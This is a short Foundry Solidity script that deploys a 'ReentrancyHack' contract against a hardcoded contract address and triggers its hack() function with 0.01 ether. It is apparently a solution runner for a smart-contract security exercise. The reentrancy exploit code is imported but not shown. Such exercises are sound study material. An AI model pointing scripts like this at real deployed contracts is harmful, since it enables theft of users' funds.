// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/ReentrancyHack.sol";

contract ReentrancyHackScript is Script {
    uint256 deployerPrivateKey;
    address _targetAddress = 0x43Ef3D96c30022d013819061C2CEf8A636dcBcB2;

    function setUp() public {
        deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    }

    function run() public {
        vm.startBroadcast(deployerPrivateKey);

        ReentrancyHack reentrancyHack = new ReentrancyHack(_targetAddress);
        reentrancyHack.hack{value: 0.01 * 1e18}();
        
        vm.stopBroadcast();
    }
}
